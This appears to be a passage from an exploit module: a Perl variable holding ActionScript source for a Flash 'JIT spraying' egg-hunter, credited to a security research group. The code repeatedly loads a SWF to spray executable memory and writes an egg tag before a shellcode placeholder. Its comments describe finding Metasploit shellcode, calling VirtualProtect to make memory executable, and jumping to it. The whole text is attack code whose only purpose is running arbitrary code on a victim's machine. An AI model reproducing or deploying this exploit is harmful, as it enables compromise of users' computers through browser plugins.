our $payl2="// Sprayng JIT.swf\n".
"// \n".
"// Spraing JIT egg-hunter shellcode\n".
"//\n".
"// Find shellcode from MetaSploit\n".
"// than find address of VirtualProtect, make mem exec and jump\n".
"//\n".
"//  By Alexey Sintsov\n".
"//	dookie\@inbox.ru\n".
"//	a.sintsov\@dsec.ru\n".
"//\n".
"//	DSecRG - Digital Security Research Group [dsecrg.com]\n".
"//\n".
"package\n".
"{\n".
"    \n".
"	import flash.display.*;\n".
"	import flash.net.*;\n".
"    import flash.text.TextField;\n".
"    import flash.text.TextFieldType;\n".
"	import flash.system.Security;\n".
"	import flash.utils.*;\n".
"	\n".
"    public class Loadzz1 extends MovieClip\n".
"    {\n".
"	\n".
"		var MyTextField1:TextField = createTextField(10, 40, 300, 20);\n".
"		var childRef:DisplayObject = null;\n".
"	\n".
"		var val:ByteArray = new ByteArray();\n".
"	\n".
"		var ic=0;\n".
"		var ldInt;\n".
"		\n".
"		private function createTextField(x:Number, y:Number, width:Number, height:Number):TextField {\n".
"            var result:TextField = new TextField();\n".
"            result.x = x;\n".
"            result.y = y;\n".
"            result.width = width;\n".
"            result.height = height;\n".
"            result.background = true;\n".
"            result.border = true;\n".
"            addChild(result);\n".
"            return result;\n".
"        }\n".
"\n".
"	\n".
"		function pageLoadEx()\n".
"		{\n".
"						\n".
"		    var ldr = new Loader();\n".
"			var url = \"jit_egg.swf\";\n".
"			var urlReq = new URLRequest(url);\n".
"            ldr.load(urlReq);\n".
"			childRef = addChild(ldr); \n".
"            \n".
"			\n".
"		}\n".
"		function pageLoad()\n".
"		{\n".
"		    \n".
"			for(var z=0;z<600;z++){pageLoadEx();}\n".
"			ic=ic+1;\n".
"			MyTextField1.text=ic+\" - JIT spraying, wait for 4 ...\";\n".
"			if(ic==4)\n".
"				{\n".
"					clearInterval(ldInt);\n".
"					MyTextField1.text=ic+\" - done, wait for sploit...\";\n".					
"				}\n".
"		}\n".
"		function metaShell() {\n".
"		val.endian = Endian.LITTLE_ENDIAN;\n".
"\n		//TAG\n".
"		val.writeInt(0x07333531)\n".
"		val.writeInt(0x07333531)\n".
"%31337%\n".
"\n".
"			}\n".
" \n".
"\n".
"		function Loadzz1()\n".
"		{\n".
"		    \n".
"           Security.allowDomain(\"*\");\n".
"			MyTextField1.type = TextFieldType.DYNAMIC;\n".
"			\n".
"			\n".
"			metaShell();\n".
"			ldInt=setInterval(pageLoad,2000);\n".
"			    \n".
"		}\n".
"    }\n".
"}\n".
"";